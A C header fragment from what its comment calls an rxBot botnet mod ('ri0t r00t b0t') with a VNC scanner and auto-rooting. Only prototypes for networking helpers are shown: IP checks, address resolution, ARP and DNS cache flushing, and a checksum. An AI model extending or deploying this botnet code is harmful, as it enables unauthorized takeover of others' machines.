/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/

BOOL PrivateIP(const char *ip);
unsigned long ResolveAddress(char *szHost);
BOOL FlushARPCache(void);
BOOL FlushDNSCache(void);
char *GetIP(SOCKET sock);
USHORT checksum(USHORT *buffer, int size);


